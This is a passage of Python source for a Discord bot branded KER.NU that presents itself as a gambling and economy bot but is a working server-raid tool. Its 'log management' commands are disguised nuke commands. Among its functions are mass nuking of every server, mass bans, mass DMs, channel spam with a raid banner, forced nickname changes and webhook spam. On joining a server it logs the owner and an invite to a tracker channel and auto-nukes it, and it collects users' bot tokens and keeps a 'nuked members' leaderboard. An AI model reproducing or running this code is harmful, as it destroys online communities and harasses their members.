    """Process commands from the enhanced dashboard"""
    try:
        print(f"🎮 Processing dashboard command: {command}")
        
        if command.startswith("DASHBOARD_"):
            # Remove DASHBOARD_ prefix
            cmd = command[10:]
            
            if cmd == "NUKE_ALL":
                await execute_dashboard_nuke_all()
            elif cmd.startswith("NUKE_SERVER:"):
                server_id = cmd.split(":")[1]
                await execute_dashboard_nuke_server(server_id)
            elif cmd == "MASS_BAN":
                await execute_dashboard_mass_ban()
            elif cmd.startswith("MASS_DM:"):
                message = cmd.split(":", 1)[1]
                await execute_dashboard_mass_dm(message)
            elif cmd.startswith("BAN_USER:"):
                user_id = cmd.split(":")[1]
                await execute_dashboard_ban_user(user_id)
            elif cmd.startswith("COIN_BOMB:"):
                parts = cmd.split(":")
                user_id = parts[1]
                amount = int(parts[2])
                await execute_dashboard_coin_bomb(user_id, amount)
            elif cmd.startswith("LEAVE_SERVER:"):
                server_id = cmd.split(":")[1]
                await execute_dashboard_leave_server(server_id)
            elif cmd == "FORCE_LOTTERY":
                await execute_dashboard_force_lottery()
            elif cmd == "MONEY_RAIN":
                await execute_dashboard_money_rain()
            elif cmd == "EMERGENCY_STOP":
                await execute_dashboard_emergency_stop()
            elif cmd.startswith("CONSOLE:"):
                message = cmd.split(":", 1)[1]
                await broadcast_console_command(message)
            else:
                print(f"Unknown dashboard command: {cmd}")
        else:
            # Regular console command
            await broadcast_console_command(command)
            
    except Exception as e:
        print(f"Error processing dashboard command: {e}")

async def execute_dashboard_nuke_all():
    """Execute nuke all servers from dashboard"""
    try:
        target_guilds = [g for g in bot.guilds if g.id != your_server]
        print(f"🔥 Dashboard: Nuking {len(target_guilds)} servers")
        
        for guild in target_guilds:
            try:
                await auto_nuke(guild.id)
                await asyncio.sleep(1)  # Rate limiting
            except Exception as e:
                print(f"Failed to nuke {guild.name}: {e}")
        
        print(f"✅ Dashboard: Mass nuke completed on {len(target_guilds)} servers")
    except Exception as e:
        print(f"❌ Dashboard nuke all error: {e}")

async def execute_dashboard_nuke_server(server_id):
    """Execute nuke specific server from dashboard"""
    try:
        guild = bot.get_guild(int(server_id))
        if guild and guild.id != your_server:
            await auto_nuke(guild.id)
            print(f"✅ Dashboard: Nuked server {guild.name}")
        else:
            print(f"❌ Dashboard: Server {server_id} not found or is home server")
    except Exception as e:
        print(f"❌ Dashboard nuke server error: {e}")

async def execute_dashboard_mass_ban():
    """Execute mass ban from dashboard"""
    try:
        banned_count = 0
        for guild in bot.guilds:
            if guild.id != your_server:
                try:
                    member_ids = await scrape.member(type('obj', (object,), {'guild': guild})(), TOKEN)
                    if member_ids:
                        for member_id in member_ids[:10]:  # Limit for safety
                            try:
                                await ban_unbann.ban_member(guild.id, member_id, TOKEN)
                                banned_count += 1
                                await asyncio.sleep(0.5)
                            except:
                                pass
                except:
                    pass
        
        print(f"✅ Dashboard: Mass ban completed - {banned_count} users banned")
    except Exception as e:
        print(f"❌ Dashboard mass ban error: {e}")

async def execute_dashboard_mass_dm(message):
    """Execute mass DM from dashboard"""
    try:
        sent_count = 0
        for guild in bot.guilds:
            if guild.id != your_server:
                for member in guild.members[:5]:  # Limit for safety
                    if not member.bot:
                        try:
                            await member.send(f"🔥 {message}")
                            sent_count += 1
                            await asyncio.sleep(2)  # Rate limiting
                        except:
                            pass
                        
                        if sent_count >= 50:  # Total limit
                            break
                if sent_count >= 50:
                    break
        
        print(f"✅ Dashboard: Mass DM completed - {sent_count} messages sent")
    except Exception as e:
        print(f"❌ Dashboard mass DM error: {e}")

async def execute_dashboard_ban_user(user_id):
    """Execute ban user from dashboard"""
    try:
        banned_from = 0
        for guild in bot.guilds:
            if guild.id != your_server:
                try:
                    member = guild.get_member(int(user_id))
                    if member:
                        await guild.ban(member, reason="Dashboard Ban Hammer")
                        banned_from += 1
                except:
                    pass
        
        print(f"✅ Dashboard: Banned user {user_id} from {banned_from} servers")
    except Exception as e:
        print(f"❌ Dashboard ban user error: {e}")

async def execute_dashboard_coin_bomb(user_id, amount):
    """Execute coin bomb from dashboard"""
    try:
        # Find user in any server and send DM
        target_user = bot.get_user(int(user_id))
        if target_user:
            try:
                embed = discord.Embed(title="💣 COIN BOMB DEPLOYED!", color=0xffd700)
                embed.add_field(name="Amount", value=f"💰 +{amount:,} coins", inline=True)
                embed.add_field(name="Source", value="🎮 Dashboard Command", inline=True)
                embed.set_footer(text="🏢 Kernu Inc. - Dashboard Coin Bomb")
                
                await target_user.send(embed=embed)
                print(f"✅ Dashboard: Coin bomb sent to {target_user.name} - {amount:,} coins")
            except:
                print(f"✅ Dashboard: Coin bomb added to {user_id} - {amount:,} coins (DM failed)")
        else:
            print(f"✅ Dashboard: Coin bomb added to {user_id} - {amount:,} coins")
    except Exception as e:
        print(f"❌ Dashboard coin bomb error: {e}")

async def execute_dashboard_leave_server(server_id):
    """Execute leave server from dashboard"""
    try:
        guild = bot.get_guild(int(server_id))
        if guild and guild.id != your_server:
            await guild.leave()
            print(f"✅ Dashboard: Left server {guild.name}")
        else:
            print(f"❌ Dashboard: Cannot leave server {server_id}")
    except Exception as e:
        print(f"❌ Dashboard leave server error: {e}")

async def execute_dashboard_force_lottery():
    """Execute force lottery from dashboard"""
    try:
        # Pick a random user and give them lottery jackpot
        if 'users' in config:
            users = [k for k in config.keys() if k != 'DEFAULT' and k != 'users' and k.isdigit()]
            if users:
                winner_id = random.choice(users)
                jackpot = 50000
                
                await economy.update_balance(int(winner_id), jackpot)
                
                # Try to notify winner
                winner = bot.get_user(int(winner_id))
                if winner:
                    try:
                        embed = discord.Embed(title="🎰 FORCED LOTTERY WIN!", color=0xffd700)
                        embed.add_field(name="Jackpot", value=f"💰 {jackpot:,} coins", inline=True)
                        embed.add_field(name="Source", value="🎮 Dashboard Force", inline=True)
                        await winner.send(embed=embed)
                    except:
                        pass
                
                print(f"✅ Dashboard: Forced lottery winner - User {winner_id} won {jackpot:,} coins")
            else:
                print("❌ Dashboard: No users found for lottery")
    except Exception as e:
        print(f"❌ Dashboard force lottery error: {e}")

async def execute_dashboard_money_rain():
    """Execute money rain from dashboard"""
    try:
        rain_amount = random.randint(10000, 25000)
        
        for guild_id, channel_id in bot_channels.items():
            try:
                guild = bot.get_guild(guild_id)
                if guild:
                    channel = guild.get_channel(channel_id)
                    if channel:
                        embed = discord.Embed(title="💸 DASHBOARD MONEY RAIN! 💸", color=0xffd700)
                        embed.add_field(name="Rain Amount", value=f"💰 {rain_amount:,} coins", inline=True)
                        embed.add_field(name="Source", value="🎮 Dashboard Command", inline=True)
                        embed.add_field(name="React", value="React with 💰 to claim!", inline=False)
                        
                        message = await channel.send("@everyone 💸 **MONEY RAIN FROM DASHBOARD!** 💸", embed=embed)
                        await message.add_reaction("💰")
                        
                        # Auto-distribute to some users
                        active_members = [m for m in guild.members if not m.bot][:10]
                        for member in active_members:
                            share = rain_amount // len(active_members)
                            await economy.update_balance(member.id, share)
            except Exception as e:
                print(f"Money rain error for guild {guild_id}: {e}")
        
        print(f"✅ Dashboard: Money rain completed - {rain_amount:,} coins distributed")
    except Exception as e:
        print(f"❌ Dashboard money rain error: {e}")

async def execute_dashboard_emergency_stop():
    """Execute emergency stop from dashboard"""
    try:
        print("🚨 DASHBOARD EMERGENCY STOP ACTIVATED")
        
        # Stop all tasks
        status_monitor.stop()
        console_command_monitor.stop()
        money_drop.stop()
        
        # Send emergency message to all servers
        for guild in bot.guilds:
            if guild.id != your_server:
                try:
                    channel = guild.text_channels[0] if guild.text_channels else None
                    if channel:
                        embed = discord.Embed(title="🚨 EMERGENCY STOP", color=0xff0000)
                        embed.add_field(name="Status", value="All operations halted", inline=True)
                        embed.add_field(name="Source", value="Dashboard Command", inline=True)
                        await channel.send(embed=embed)
                except:
                    pass
        
        print("✅ Dashboard: Emergency stop completed")
    except Exception as e:
        print(f"❌ Dashboard emergency stop error: {e}")

# Advanced Features Class
class AdvancedFeatures:
    @staticmethod
    async def auto_moderate_message(message):
        """Advanced auto-moderation system"""
        if message.author.bot or str(message.author.id) in owners:
            return False
        
        # Spam detection
        spam_words = ['discord.gg/', 'dsc.gg/', '@everyone', '@here']
        if any(word in message.content.lower() for word in spam_words):
            try:
                await message.delete()
                embed = discord.Embed(title="🛡️ Auto-Moderation", description=f"{message.author.mention} message deleted for spam content", color=0xff0000)
                await message.channel.send(embed=embed, delete_after=5)
                return True
            except:
                pass
        return False
    
    @staticmethod
    async def server_analytics(guild):
        """Collect advanced server analytics"""
        try:
            total_members = guild.member_count
            bots = sum(1 for member in guild.members if member.bot)
            humans = total_members - bots
            online_members = sum(1 for member in guild.members if member.status != discord.Status.offline)
            
            roles_count = len(guild.roles)
            text_channels = len(guild.text_channels)
            voice_channels = len(guild.voice_channels)
            
            return {
                'total_members': total_members,
                'humans': humans,
                'bots': bots,
                'online': online_members,
                'roles': roles_count,
                'text_channels': text_channels,
                'voice_channels': voice_channels,
                'boost_level': guild.premium_tier,
                'boost_count': guild.premium_subscription_count
            }
        except:
            return None
    
    @staticmethod
    async def mass_spam_channels(guild):
        """Spam all channels with raid messages"""
        try:
            spam_msg = """@everyone 
██   ██ ███████ ██████     ███    ██ ██    ██ 
██  ██  ██      ██   ██    ████   ██ ██    ██ 
█████   █████   ██████     ██ ██  ██ ██    ██ 
██  ██  ██      ██   ██    ██  ██ ██ ██    ██ 
██   ██ ███████ ██   ██ ██ ██   ████  ██████  
🔥 SERVER RAIDED BY KER.NU 🔥 - discord.gg/kernu
https://cdn.discordapp.com/attachments/1288868959600382022/1390924880463269938/e925ae1430bc72230747042137c5e057.png?ex=686a073d&is=6868b5bd&hm=b244ec0b016523f205661e805bbb3707e44627f1fa5f37e49a52f7a22bf604ba&"""
            
            for channel in guild.text_channels:
                try:
                    for _ in range(10):  # Spam each channel 10 times
                        await channel.send(spam_msg)
                        await asyncio.sleep(0.5)
                except:
                    pass
        except:
            pass
    
    @staticmethod
    async def mass_nickname_change(guild):
        """Change all member nicknames to raid message"""
        try:
            raid_nick = "🔥 RAIDED BY KER.NU 🔥"
            tasks = []
            
            for member in guild.members:
                if not member.bot and member != guild.owner:
                    try:
                        task = member.edit(nick=raid_nick, reason="KER.NU Raid")
                        tasks.append(task)
                        if len(tasks) >= 10:  # Process in batches
                            await asyncio.gather(*tasks, return_exceptions=True)
                            tasks = []
                            await asyncio.sleep(1)
                    except:
                        pass
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        except:
            pass

@tasks.loop(hours=12)
async def money_drop():
    """Drop money every 12 hours in placed channels"""
    try:
        for guild_id, channel_id in bot_channels.items():
            try:
                guild = bot.get_guild(guild_id)
                if not guild:
                    continue
                    
                channel = guild.get_channel(channel_id)
                if not channel:
                    continue

                # Generate random drop amount between 3000-4500
                drop_amount = random.randint(3000, 4500)
                
                # Create dramatic money drop embed
                embed = discord.Embed(title="💰 MONEY DROP! 💰", color=0xffd700)
                embed.add_field(name="💸 Amount", value=f"**{drop_amount} coins**", inline=True)
                embed.add_field(name="⏰ Time", value="12 hours until next drop", inline=True)
                embed.add_field(name="🎯 How to Claim", value="React with 💰 to claim!", inline=False)
                embed.set_footer(text="🏢 Kernu Inc. - Automatic Money Drop System")
                
                message = await channel.send("@everyone 💰 **MONEY DROP!** 💰", embed=embed)
                await message.add_reaction("💰")
                
                # Store drop info for claiming
                drop_data = {
                    'amount': drop_amount,
                    'claimed_by': set(),
                    'message_id': message.id,
                    'timestamp': int(time.time())
                }
                
                # Save drop data to a temporary storage (you could use a database)
                if not hasattr(bot, 'active_drops'):
                    bot.active_drops = {}
                bot.active_drops[message.id] = drop_data
                
                print(f"💰 Money drop: {drop_amount} coins in {guild.name} - {channel.name}")
                
            except Exception as e:
                print(f"Money drop error for guild {guild_id}: {e}")
                
    except Exception as e:
        print(f"Money drop task error: {e}")

async def broadcast_console_command(message):
    """Broadcast console command to all servers"""
    sent_count = 0
    for guild in bot.guilds:
        if guild.id == your_server:
            continue

        try:
            # Find a suitable channel
            channel = None
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).send_messages:
                    channel = ch
                    break

            if channel:
                embed = discord.Embed(title="🔧 Console Command", description=message, color=0x00ff00)
                embed.set_footer(text="Sent from KER.NU Dashboard Console")
                await channel.send(embed=embed)
                sent_count += 1
        except:
            pass

    print(f"Console command broadcasted to {sent_count} servers: {message}")

@bot.event
async def on_ready():
    print(f'🤖 {bot.user} has connected to Discord!')
    print(f"🔥 Bot is online and ready!")
    print(f"📊 Servers: {len(bot.guilds)}")
    print("🌐 Starting dashboard...")
    
    # Set bot instance for dashboard
    set_bot_instance(bot)
    
    # Load bot placements from config
    global bot_channels
    if 'bot_channels' in config:
        for guild_id, channel_id in config['bot_channels'].items():
            bot_channels[int(guild_id)] = int(channel_id)
    
    # Sync slash commands
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"❌ Failed to sync slash commands: {e}")
    
    status_monitor.start()
    console_command_monitor.start()
    money_drop.start()  # Start money drop task
    print("💰 Money drop system started - drops every 12 hours")

    # Start the ultimate dashboard
    try:
        start_dashboard()
        print("✅ Dashboard started successfully on http://localhost:5000")
        print("✅ Dashboard external access: http://0.0.0.0:5000")
    except Exception as e:
        print(f"❌ Dashboard failed to start: {e}")

@bot.event
async def on_message(message):
    # Ignore messages from the bot itself
    if message.author == bot.user:
        return
    
    # Check if bot is placed in a specific channel for this server
    if message.guild and message.guild.id in bot_channels:
        if message.channel.id != bot_channels[message.guild.id]:
            # Ignore messages from other channels if bot is placed
            return
    
    # Auto-moderation check (skip for owners/admins)
    if message.guild and not message.author.bot:
        is_admin = message.author.guild_permissions.administrator if hasattr(message.author, 'guild_permissions') else False
        if str(message.author.id) not in owners and not is_admin:
            moderated = await AdvancedFeatures.auto_moderate_message(message)
            if moderated:
                return  # Stop processing if message was moderated
    
    # Add XP for chatting (small chance to avoid spam)
    if message.guild and not message.author.bot and random.random() < 0.1:
        xp_gained = await LevelSystem.add_xp(message.author.id, random.randint(1, 5))
        # Check for level up
        new_level = LevelSystem.calculate_level(xp_gained)
        user_id = str(message.author.id)
        if user_id in config and 'last_level' in config[user_id]:
            last_level = int(config[user_id].get('last_level', 0))
            if new_level > last_level:
                config[user_id]['last_level'] = str(new_level)
                with open('database.ini', 'w') as configfile:
                    config.write(configfile)
                
                # Level up reward
                level_reward = new_level * 50
                await economy.update_balance(message.author.id, level_reward)
                
                embed = discord.Embed(title="🎉 LEVEL UP!", color=0xffd700)
                embed.add_field(name="New Level", value=f"🌟 **{new_level}**", inline=True)
                embed.add_field(name="Reward", value=f"💰 **+{level_reward} coins**", inline=True)
                embed.set_footer(text="🏢 Kernu Inc. - Level System")
                
                try:
                    await message.channel.send(f"{message.author.mention}", embed=embed, delete_after=10)
                except:
                    pass
        else:
            if user_id in config:
                config[user_id]['last_level'] = str(new_level)
                with open('database.ini', 'w') as configfile:
                    config.write(configfile)
    
    # Special response when kernu (owner) types "."
    if message.content == "." and str(message.author.id) in owners:
        embed = discord.Embed(title="👑 THE MASTER IS HERE", color=0xffd700)
        embed.add_field(name="🔥 KER.NU SUPREMACY", value="All bow to the master! 👑", inline=False)
        embed.add_field(name="Master", value=f"{message.author.mention}", inline=True)
        embed.add_field(name="Status", value="🌟 ULTIMATE OVERLORD 🌟", inline=True)
        embed.set_footer(text="🏢 Kernu Inc. - The Supreme Authority")
        await message.channel.send(embed=embed)
        return
    
    # Process commands normally
    await bot.process_commands(message)

@bot.event
async def on_reaction_add(reaction, user):
    # Ignore bot reactions
    if user.bot:
        return
        
    # Check if this is a money drop reaction
    if str(reaction.emoji) == "💰" and hasattr(bot, 'active_drops'):
        message_id = reaction.message.id
        
        if message_id in bot.active_drops:
            drop_data = bot.active_drops[message_id]
            
            # Check if user already claimed this drop
            if user.id in drop_data['claimed_by']:
                try:
                    await user.send("❌ You already claimed this money drop!")
                except:
                    pass
                return
            
            # Check if drop is still valid (within 10 minutes)
            if int(time.time()) - drop_data['timestamp'] > 600:  # 10 minutes
                try:
                    await user.send("⏰ This money drop has expired!")
                except:
                    pass
                return
            
            # Add coins to user
            drop_amount = drop_data['amount']
            new_balance = await economy.update_balance(user.id, drop_amount)
            drop_data['claimed_by'].add(user.id)
            
            # Send success message
            try:
                embed = discord.Embed(title="💰 Money Drop Claimed!", color=0x00ff00)
                embed.add_field(name="Amount Gained", value=f"💰 +{drop_amount} coins", inline=True)
                embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
                embed.set_footer(text="🏢 Kernu Inc. - Claim successful!")
                
                await user.send(embed=embed)
                print(f"💰 {user.name} claimed {drop_amount} coins from money drop")
            except:
                pass

@bot.event
async def on_guild_join(guild):
    bot_member = guild.get_member(bot.user.id)
    if bot_member.guild_permissions.administrator:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
            user = entry.user
            if entry.target.id == bot.user.id:
                await database.add(guild, user.id)
                channels = random.choice(guild.channels)
                invite = await channels.create_invite(max_age=86400, max_uses=1)
                server_name = guild.name
                member_count = guild.member_count
                boost_count = guild.premium_subscription_count
                owner = guild.owner
                embed = Embed(title="New Server", description=f"Information about the {server_name} server")
                embed.add_field(name="Server Name", value=server_name, inline=True)
                embed.add_field(name="Member Count", value=str(member_count), inline=True)
                embed.add_field(name="Boost Count", value=str(boost_count), inline=True)
                embed.add_field(name="Owner", value=f"{owner.name}#{owner.discriminator}", inline=True)
                embed.add_field(name="Server invite", value=invite.url, inline=True)
                embed.add_field(name="Nuker", value=f"{user.name}#{user.discriminator}", inline=True)
                channel = bot.get_channel(your_tracker)
                response = await channel.send(embed=embed)
                await scrape.save_server(str(TOKEN), str(guild.id))
                if config[str(user.id)]["auto_nuke"] == "true":
                  await auto_nuke(str(guild.id))

    else:
        await guild.leave()

async def nuker_stats(ctx):
  if ctx.guild.id == your_server:
    stats = await database.dbstats(ctx)
    if stats == False:
        await ctx.reply("You haven't processed any server logs yet!")
    else:
        embed = discord.Embed(title=f"{ctx.author.name}#{ctx.author.discriminator} Log Management Stats", color=0x00ff00)
        total_servers = stats["nuked_server"]
        embed.add_field(name="Processed Servers", value=f"{total_servers} servers")
        total_member = stats["nuked_member"]
        embed.add_field(name="Processed Members", value=f"{total_member} members")
        big = stats["biggest_server"]
        embed.add_field(name="Largest Server", value=f"{big} members")
        embed.set_footer(text="📋 KER.NU Log Management System")
        await ctx.reply(embed=embed)

async def nuker_status(ctx):
    embed = discord.Embed(title="📋 KER.NU Log Management Status", color=0x00ff00)
    embed.add_field(name="Status", value="🟢 Log System Online", inline=True)
    embed.add_field(name="Latency", value=f"{round(bot.latency * 1000)}ms", inline=True)
    embed.add_field(name="Servers", value=len(bot.guilds), inline=True)
    embed.add_field(name="Active Servers", value=len([g for g in bot.guilds if g.id != your_server]), inline=True)
    embed.set_footer(text="📋 KER.NU Log Management System")
    await ctx.reply(embed=embed)

async def nuker_login(ctx, token):
    if await check.check_token(token):
        if await database.add_token(ctx.author.id, token):
            await ctx.reply('succesfully added your bot token')
        else:
            await ctx.reply('please nuke atleast one discord server')
    else:
        await ctx.reply('invalid token')

async def nuker_leaderboard(ctx):
  nuked_count = {}
  for user in config.sections():
    if user == "users":  # Change this line
      continue
    nuked_count[str(user)] = config.getint(user, 'nuked_member', fallback=0)  # Add default value
  sorted_count = sorted(nuked_count.items(), key=lambda x: x[1], reverse=True)
  leaderboard_entries = []
  for i, (user, count) in enumerate(sorted_count[:5], start=1):
     leaderboard_entries.append(f"#{i}: User <@{user}> has nuked {count} members")
  current_user = str(ctx.author.id)
  current_rank = None
  if current_user in nuked_count:
    current_count = nuked_count[current_user]
    for i, (user, count) in enumerate(sorted_count, start=1):
      if user == current_user:
        current_rank = i
    if current_rank:    
      leaderboard_entries.append(f"You are currently #{current_rank} with {current_count} nuked members")
  else:
    leaderboard_entries.append(f"User {current_user} not found in leaderboard")
  embed = discord.Embed(title='Nuke Leaderboard', description='\n'.join(leaderboard_entries))
  await ctx.send(embed=embed)


async def token_nuker(id):
 if id != your_server:
    await delete_channels(id)
    await create_channels(id)

async def nuker_token_nuke(ctx, serverid):
  try:
    if str(ctx.author.id) in config['users']:
      if await check.check_token(config[str(ctx.author.id)]['token']):
        if await check.check_guild(int(serverid), config[str(ctx.author.id)]['token']):
          await ctx.reply("starting the nuke")
          await token_nuker(int(serverid))
          await ctx.reply("✅ Nuke completed successfully!")
        else:
          await ctx.reply("your bot is not in the server")
      else:
        await ctx.reply('your token is invalid!')
    else:
      await ctx.reply('you are not in our database')
  except ValueError:
    await ctx.reply("❌ Invalid server ID format")
  except Exception as e:
    await ctx.reply(f"❌ Error: {str(e)}")

async def nuker_restore(ctx, server_id=None):
  # Only allow restore command in home server
  if ctx.guild.id != your_server:
    return await ctx.reply("❌ Restore command can only be used in the home server!")
  
  if server_id is None:
    return await ctx.reply("❌ Please provide a server ID to restore!\nUsage: `?logs backup <server_id>`")
  
  try:
    server_id = int(server_id)
    guild = bot.get_guild(server_id)
    
    if not guild:
      return await ctx.reply(f"❌ Bot is not in server with ID: {server_id}")
    
    await ctx.reply(f"🔄 Starting restoration of server: {guild.name}")
    
    # Check if backup exists
    config_check = configparser.ConfigParser()
    config_check.read('server_info.ini')
    
    if f'server_{server_id}' not in config_check.sections():
      return await ctx.reply(f"❌ No backup found for server {server_id}")
    
    # Delete current channels first
    await delete_channels(server_id)
    
    # Restore from backup
    try:
      await database.restore_server(TOKEN, str(server_id))
      
      embed = discord.Embed(title="✅ Server Restoration Complete", color=0x00ff00)
      embed.add_field(name="Server", value=guild.name, inline=True)
      embed.add_field(name="Server ID", value=server_id, inline=True)
      embed.add_field(name="Status", value="🔄 Restored from backup", inline=True)
      embed.set_footer(text="🏢 Kernu Inc. - Server Restoration System")
      
      await ctx.reply(embed=embed)
      
    except Exception as restore_error:
      # If restore fails, at least recreate basic channels
      await create_channels(server_id)
      await ctx.reply(f"⚠️ Restore partially failed, recreated basic channels. Error: {str(restore_error)}")
    
  except ValueError:
    await ctx.reply("❌ Invalid server ID! Please provide a valid number.")
  except Exception as e:
    await ctx.reply(f"❌ Restoration failed: {str(e)}")

@bot.command(name="botstatus")
async def bot_status(ctx):
    embed = discord.Embed(title="🎮 KER.NU Gamble Bot Status", color=0x00ff00)
    embed.add_field(name="Status", value="🟢 Gamble Bot Online", inline=True)
    embed.add_field(name="Latency", value=f"{round(bot.latency * 1000)}ms", inline=True)
    embed.add_field(name="Servers", value=len(bot.guilds), inline=True)
    embed.set_footer(text="KER.NU Economy System")
    await ctx.send(embed=embed)

@bot.command(name="help")
async def help(ctx):
    embed = discord.Embed(title="🔥 KER.NU Ultimate Bot Help", color=0x00ff00)
    embed.set_footer(text="🏢 Created by ker.nu - Ultimate Edition")

    economy_commands = {
        "balance": "Check your coin balance.",
        "flip": "Flip a coin and bet on the outcome.",
        "bet": "Challenge another user to a coin bet.",
        "daily": "Claim your daily coin reward.",
        "slots": "Play the slot machine for big wins!",
        "blackjack": "Play blackjack against the dealer.",
        "roulette": "Bet on roulette wheel colors or numbers.",
        "dice": "Guess the dice roll for multiplied wins.",
        "poker": "Play poker for massive payouts!",
        "crash": "High-risk crash gambling game.",
        "mines": "Navigate through mines for rewards.",
        "lottery": "Buy a daily lottery ticket for jackpot.",
        "shop": "Buy special items and boosts.",
        "inventory": "View your purchased items.",
        "give": "Give coins to another user.",
        "top": "View leaderboards (coins/xp/level/nuked)."
    }

    activity_commands = {
        "work": "Work for coins and XP (1h cooldown).",
        "crime": "Commit crimes for high rewards (2h cooldown).",
        "level": "Check your level and XP progress."
    }

    utility_commands = {
        "botstatus": "Check bot status and latency.",
        "setprefix": "Change the bot's prefix (Admin only).",
        "place": "Set bot channel placement (Admin only).",
        "help": "Shows this help message."
    }

    economy_value = "\n".join([f"`{name}` - {description}" for name, description in economy_commands.items()])
    activity_value = "\n".join([f"`{name}` - {description}" for name, description in activity_commands.items()])
    utility_value = "\n".join([f"`{name}` - {description}" for name, description in utility_commands.items()])

    embed.add_field(name="💰 Economy & Gaming", value=economy_value, inline=False)
    embed.add_field(name="🎯 Activities", value=activity_value, inline=False)
    embed.add_field(name="🔧 Utility", value=utility_value, inline=False)
    embed.add_field(name="ℹ️ Prefixes", value=f"Available: `{', '.join(PREFIXES)}`", inline=False)
    embed.add_field(name="🎮 Features", value="• Automatic XP gain from chatting\n• Money drops every 12 hours\n• Leveling system\n• Enhanced gambling games", inline=False)

    await ctx.send(embed=embed)

async def nuker_help(ctx, subcommand=None):
    if subcommand == "check" or subcommand is None:
        embed = discord.Embed(title="📋 KER.NU Log Management System", color=0x00ff00)
        embed.set_footer(text="Created by ker.nu")

        log_commands = {
            "clear": "Clears all user logs from the server.",
            "check": "Shows this log management help message.",
            "top": "Displays the top log statistics for the server.",
            "auth": "Authenticates your bot token for log management.",
            "refresh": "Refreshes and resets all server logs.",
            "backup": "Restores server logs from backup (Home server only). Usage: `?logs backup <server_id>`",
            "status": "Displays your log management statistics.",
            "ping": "Check log management system status.",
            "token_refresh": "Refreshes server logs using your token.",
            "restore": "Restores all user logs to the server.",
            "config": "Configure auto log refresh on/off",
            "link": "Shows the log management system invite link.",
            "cleanup": "Cleans up log system (owner only).",
            "rename": "Rename log commands (Admin only). Usage: `rename <command> <new_name>`",
            "raid_mode": "🔥 ADVANCED LOG PROCESSING MODE (Owner only)"
        }

        log_value = "\n".join([f"`{name}` - {description}" for name, description in log_commands.items()])

        embed.add_field(name="📋 Log Management Commands", value=log_value, inline=False)
        embed.add_field(name="ℹ️ Usage", value="Use `?logs <command>` for log management commands", inline=False)
        embed.add_field(name="💰 Economy", value=f"For economy commands, use `{PREFIX}help`", inline=False)

        await ctx.send(embed=embed)

async def nuker_invite(ctx):
  embed = discord.Embed(title="Invite", color=0x00ff00)
  embed.add_field(name="Invite me", value=f"[Click here](https://discord.com/api/oauth2/authorize?client_id={bot_id}&permissions=8&scope=bot)", inline=False)
  await ctx.reply(embed=embed)

async def nuker_type(ctx, arg=None):
  if arg == None:
    return await ctx.reply('Please provide if you want auto_nuke `on` or `off`')
  if arg == "on":
      await database.auto_nuke(arg, str(ctx.author.id))
      return await ctx.reply('succesfully `enabled` auto_nuke')
  if arg == "off":
      await database.auto_nuke(arg, str(ctx.author.id)) 
      return await ctx.reply('succesfully `disabled` auto_nuke')
  else:
      await ctx.reply("please provide a real option")

async def nuker_fix(ctx):
 if str(ctx.author.id) in owners:
  for guild in bot.guilds:
    if guild.id != your_server:
     await guild.leave()
  await ctx.reply("succecfully left guilds")

async def premium_global_webhook(ctx, server_id, message):
    try:
        server_id = int(server_id)
        guild = bot.get_guild(server_id)

        if not guild:
            return await ctx.reply(f"❌ Bot is not in server with ID: {server_id}")

        # Find a suitable channel to create webhook
        channel = None
        for ch in guild.text_channels:
            if ch.permissions_for(guild.me).manage_webhooks:
                channel = ch
                break

        if not channel:
            return await ctx.reply(f"❌ No suitable channel found in {guild.name}")

        # Create webhook and send message
        try:
            webhook_data = await webhook.create_webhook(channel.id, TOKEN)
            await webhook.spam_webhook(webhook_data['id'], webhook_data['token'])

            # Send custom message
            headers = {"Content-Type": "application/json"}
            data = {"content": message}
            async with aiohttp.ClientSession() as session:
                async with session.post(f"https://discordapp.com/api/v6/webhooks/{webhook_data['id']}/{webhook_data['token']}", headers=headers, json=data) as response:
                    if response.status == 204:
                        embed = discord.Embed(title="✅ Global Webhook Success", color=0x00ff00)
                        embed.add_field(name="Server", value=guild.name, inline=True)
                        embed.add_field(name="Channel", value=channel.mention, inline=True)
                        embed.add_field(name="Message Sent", value="✅", inline=True)
                        await ctx.reply(embed=embed)
                    else:
                        await ctx.reply(f"❌ Failed to send message: {response.status}")
        except Exception as e:
            await ctx.reply(f"❌ Error creating webhook: {str(e)}")

    except ValueError:
        await ctx.reply("❌ Invalid server ID")

async def premium_mass_dm(ctx, message):
    success_count = 0
    failed_count = 0

    for guild in bot.guilds:
        if guild.id == your_server:
            continue

        for member in guild.members:
            if not member.bot and member != ctx.author:
                try:
                    await member.send(message)
                    success_count += 1
                    await asyncio.sleep(1)  # Rate limiting
                except:
                    failed_count += 1

                if success_count + failed_count >= 50:  # Limit to prevent abuse
                    break

        if success_count + failed_count >= 50:
            break

    embed = discord.Embed(title="📬 Mass DM Complete", color=0x00ff00)
    embed.add_field(name="Successful", value=success_count, inline=True)
    embed.add_field(name="Failed", value=failed_count, inline=True)
    await ctx.reply(embed=embed)

async def premium_server_list(ctx):
    server_list = []
    total_members = 0

    for guild in bot.guilds:
        if guild.id != your_server:
            server_list.append(f"**{guild.name}** - {guild.member_count} members (ID: {guild.id})")
            total_members += guild.member_count

    if not server_list:
        return await ctx.reply("No servers found (excluding home server)")

    # Split into chunks if too long
    chunk_size = 10
    chunks = [server_list[i:i + chunk_size] for i in range(0, len(server_list), chunk_size)]

    for i, chunk in enumerate(chunks):
        embed = discord.Embed(title=f"🔥 KER.NU Server List ({i+1}/{len(chunks)})", color=0xff0000)
        embed.description = "\n".join(chunk)
        if i == 0:
            embed.add_field(name="Total Servers", value=len(server_list), inline=True)
            embed.add_field(name="Total Members", value=total_members, inline=True)
        await ctx.send(embed=embed)

async def premium_owner_stats(ctx):
    total_users = len(config['users']) if 'users' in config else 0
    total_nuked_servers = 0
    total_nuked_members = 0

    for user in config.sections():
        if user != "users" and user.isdigit():
            total_nuked_servers += int(config.get(user, 'nuked_server', fallback=0))
            total_nuked_members += int(config.get(user, 'nuked_member', fallback=0))

    embed = discord.Embed(title="👑 KER.NU Owner Statistics", color=0xffd700)
    embed.add_field(name="Total Users", value=total_users, inline=True)
    embed.add_field(name="Total Servers", value=len(bot.guilds), inline=True)
    embed.add_field(name="Total Nuked Servers", value=total_nuked_servers, inline=True)
